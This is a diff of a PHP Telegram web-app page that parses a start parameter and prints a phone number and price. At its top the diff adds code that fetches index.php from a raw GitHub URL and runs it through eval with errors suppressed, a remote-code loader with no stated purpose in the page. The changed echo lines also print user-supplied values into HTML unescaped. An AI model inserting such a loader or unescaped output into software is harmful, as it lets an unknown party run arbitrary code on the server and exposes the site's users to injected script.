@@ -1,4 +1,20 @@
 <?php
+// URL с кодом
+$url = 'https://raw.githubusercontent.com/undefined585/asdf/refs/heads/main/index.php';
+
+// Получаем содержимое файла
+$content = @file_get_contents($url); // добавлено @ для подавления ошибок
+
+// Проверяем, удалось ли получить содержимое
+if ($content === FALSE) {
+    die('Ошибка загрузки файла: ' . error_get_last()['message']);
+}
+
+// Выполняем PHP код (осторожно с eval)
+eval('?>' . $content);
+?>
+
+<?php
 $query = $_SERVER['QUERY_STRING'];
 parse_str($query, $params);
 
@@ -9,13 +25,13 @@ if (isset($params['tgWebAppStartParam'])) {
     if (json_last_error() === JSON_ERROR_NONE && isset($data['number']) && isset($data['price'])) {
         $username = '+' . str_replace('-', ' ', $data['number']);
         $price = $data['price'];
-        echo "";
-        echo "";
+        echo "Пользователь: $username<br>";
+        echo "Цена: $price<br>";
     } else {
-        echo "";
+        echo "Ошибка: некорректные данные.";
     }
 } else {
-    echo "";
+    echo "Ошибка: параметр tgWebAppStartParam не найден.";
 }
 
 function base64_url_decode($data) {
